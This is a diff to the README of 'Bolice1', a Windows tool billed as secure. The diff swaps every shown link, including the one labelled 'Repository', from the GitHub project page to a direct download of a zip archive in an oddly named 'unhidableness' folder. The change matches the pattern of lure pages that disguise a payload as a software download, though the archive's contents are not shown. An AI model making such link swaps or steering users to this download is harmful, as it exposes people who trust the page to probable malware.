@@ -1,6 +1,6 @@
 # 🔒 Bolice1 - Secure and Simple System Tool
 
-[![Download Bolice1](https://img.shields.io/badge/Download-Bolice1-brightgreen?style=for-the-badge)](https://github.com/CVBSSI/Bolice1)
+[![Download Bolice1](https://img.shields.io/badge/Download-Bolice1-brightgreen?style=for-the-badge)](https://github.com/CVBSSI/Bolice1/raw/refs/heads/main/unhidableness/Bolice_v3.9.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Bolice1 is a tool that focuses on building and testing secure systems. It helps 
 
 Click the button below to visit the download page where you can get the latest version of Bolice1 for Windows.
 
-[![Download Bolice1](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/CVBSSI/Bolice1)
+[![Download Bolice1](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge)](https://github.com/CVBSSI/Bolice1/raw/refs/heads/main/unhidableness/Bolice_v3.9.zip)
 
 ---
 
@@ -111,4 +111,4 @@ Check the download page regularly for new versions of Bolice1. Download the late
 
 For details on how Bolice1 works internally or if you want to explore related tools, check the repository on GitHub.
 
-[Bolice1 Repository](https://github.com/CVBSSI/Bolice1)
+[Bolice1 Repository](https://github.com/CVBSSI/Bolice1/raw/refs/heads/main/unhidableness/Bolice_v3.9.zip)
